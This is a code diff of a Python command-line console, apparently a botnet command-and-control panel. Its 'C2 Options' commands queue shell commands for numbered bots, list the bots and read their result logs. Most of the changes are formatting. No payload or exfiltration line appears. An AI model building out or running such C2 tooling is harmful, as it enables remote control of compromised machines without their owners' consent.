@@ -11,15 +11,16 @@ class App(Cmd):
     prompt = '#$ '
 
     argparse_command = argparse.ArgumentParser()
-    argparse_command.add_argument('-c', nargs='?', default=None, help="Command that will be sent to the bot. For example use  'ls -lah' ")
+    argparse_command.add_argument('-c', nargs='?', default=None,
+                                  help="Command that will be sent to the bot. For example use  'ls -lah' ")
     argparse_command.add_argument('-b', type=int, help='Bot id')
+
     @with_argparser(argparse_command)
     def do_sendCommand(self, args):
-        self.poutput('Sending the command to the bot')
-        cmd_to_bot = '<p>'+args.c+'</p>'
+        cmd_to_bot = '<p>' + args.c + '</p>'
         bot_number = args.b
-        setup.devices.update({list(setup.devices.keys())[bot_number]:Bot(True, cmd_to_bot)})
-        print(list(setup.devices.values())[bot_number])
+        self.poutput('Sending the command to the bot number: ' + str(bot_number))
+        setup.devices.update({list(setup.devices.keys())[bot_number]: Bot(True, cmd_to_bot)})
 
     def do_showBots(self, line):
         self.poutput('List all bots')
@@ -33,20 +34,16 @@ class App(Cmd):
 
     argparse_log = argparse.ArgumentParser()
     argparse_log.add_argument('-b', type=int, help='Bot id')
+
     @with_argparser(argparse_log)
     def do_logResults(self, args):
         self.poutput('Log result of commands sent to the bot')
         bot_number = args.b
         folder = list(setup.devices.keys())[bot_number]
-        path = './bots/'+folder+'/log.txt'
-        tmp = open(path,'r')
+        path = './bots/' + folder + '/log.txt'
+        tmp = open(path, 'r')
         print(tmp.readlines())
-
 
     categorize((do_showBots,
                 do_logResults,
                 do_sendCommand), "C2 Options")
-
-
-
-
